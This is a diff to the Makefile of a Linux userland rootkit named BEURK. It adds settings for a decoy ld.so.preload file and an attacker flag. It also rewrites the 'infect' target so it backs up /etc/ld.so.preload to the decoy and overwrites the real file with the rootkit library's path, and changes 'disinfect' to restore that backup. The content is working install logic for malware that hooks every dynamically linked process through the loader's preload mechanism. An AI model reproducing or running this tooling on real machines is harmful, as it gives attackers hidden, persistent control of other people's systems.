@@ -3,17 +3,21 @@ UNAME				:= $(shell uname -s)
 SHELL				:= /bin/bash
 
 # set default config values (can be overidden by setting env vars)
-BEURK_CONFIG_FILE	?= beurk.conf
-BEURK_LIBRARY_NAME	?= $(shell grep -E '^LIBRARY_NAME[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
-BEURK_DEBUG_LEVEL	?= $(shell grep -E '^DEBUG_LEVEL[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
-BEURK_INFECT_DIR	?= $(shell grep -E '^INFECT_DIR[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
+BEURK_CONFIG_FILE			?= beurk.conf
+BEURK_LIBRARY_NAME			?= $(shell grep -E '^LIBRARY_NAME[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
+BEURK_DEBUG_LEVEL			?= $(shell grep -E '^DEBUG_LEVEL[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
+BEURK_INFECT_DIR			?= $(shell grep -E '^INFECT_DIR[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
+BEURK_FAKE_LD_PRELOAD		?= $(shell grep -E '^FAKE_LD_PRELOAD[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
+BEURK_ENV_IS_ATTACKER		?= $(shell grep -E '^_ENV_IS_ATTACKER[[:space:]]*=' $(BEURK_CONFIG_FILE) | cut -d= -f2 | xargs)
 
 # do not infect the system in debug mode
 ifneq ($(BEURK_DEBUG_LEVEL), 0)
     BEURK_LD_PRELOAD := /tmp/beurk/ld.so.preload
     BEURK_INFECT_DIR := /tmp/beurk
+    #BEURK_FAKE_LD_PRELOAD := /tmp/beurk/$(BEURK_FAKE_LD_PRELOAD)
 else
     BEURK_LD_PRELOAD := /etc/ld.so.preload
+    BEURK_FAKE_LD_PRELOAD := $(BEURK_FAKE_LD_PRELOAD)
 endif
 
 # absolute install path
@@ -113,14 +117,16 @@ infect: $(BEURK_LIBRARY_NAME)
 	@echo "Install in $(BEURK_INFECT_ABSPATH)"
 	install -d $(BEURK_INFECT_DIR)
 	install -m 755 $(BEURK_LIBRARY_NAME) $(BEURK_INFECT_DIR)/
-	echo $(BEURK_INFECT_ABSPATH) >> $(BEURK_LD_PRELOAD)
+	cp $(BEURK_LD_PRELOAD) $(BEURK_FAKE_LD_PRELOAD) || touch $(BEURK_FAKE_LD_PRELOAD)
+	echo $(BEURK_INFECT_ABSPATH) > $(BEURK_LD_PRELOAD)
 	@echo "Successful infection"
 
 # uninstall the rootkit (if installed on current system)
 disinfect:
 	@echo "Uninstall $(BEURK_INFECT_ABSPATH)"
 	$(RM) $(BEURK_INFECT_DIR)/$(BEURK_LIBRARY_NAME)
-	sed '#$(BEURK_INFECT_ABSPATH)#d' $(BEURK_LD_PRELOAD) > $(BEURK_LD_PRELOAD)
+	$(BEURK_ENV_IS_ATTACKER)=true cp /dev/null $(BEURK_LD_PRELOAD)
+	mv $(BEURK_FAKE_LD_PRELOAD) $(BEURK_LD_PRELOAD)
 	@echo "Successful disinfection"
 
 # remove object files
